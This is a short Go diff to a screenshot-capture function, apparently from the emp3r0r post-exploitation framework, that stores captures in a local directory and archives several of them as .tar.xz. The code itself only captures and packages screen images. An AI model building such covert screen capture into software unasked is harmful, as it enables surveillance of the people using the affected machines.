@@ -11,8 +11,8 @@ import (
 	"strconv"
 	"time"
 
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/kbinani/screenshot"
-	"github.com/mholt/archiver/v3"
 )
 
 // Screenshot take a screenshot
@@ -26,6 +26,20 @@ func Screenshot() (path string, err error) {
 		return
 	}
 	log.Printf("Taking screenshot of %d displays", n)
+
+	// get current working directory
+	cwd, err := os.Getwd()
+	if err != nil {
+		err = fmt.Errorf("getwd: %v", err)
+		return
+	}
+
+	// create a directory to store screenshots
+	// if it doesn't exist
+	screenshotDir := cwd + "/screenshots"
+	if !util.IsDirExist(screenshotDir) {
+		os.Mkdir(screenshotDir, 0o700)
+	}
 
 	now := time.Now()
 	timedate := fmt.Sprintf("%d-%02d-%02d_%02d-%02d-%02d",
@@ -61,10 +75,10 @@ func Screenshot() (path string, err error) {
 	// if we get more than one pictures
 	// pack them into one zip archive
 	if len(pics) > 1 {
-		path = timedate + ".zip"
-		err = archiver.Archive(pics, path)
+		path = timedate + ".tar.xz"
+		err = util.TarXZ(screenshotDir, path)
 		if err != nil {
-			err = fmt.Errorf("Making archive: %v", err)
+			err = fmt.Errorf("making archive: %v", err)
 			log.Printf("Making archive: %v", err)
 			return
 		}
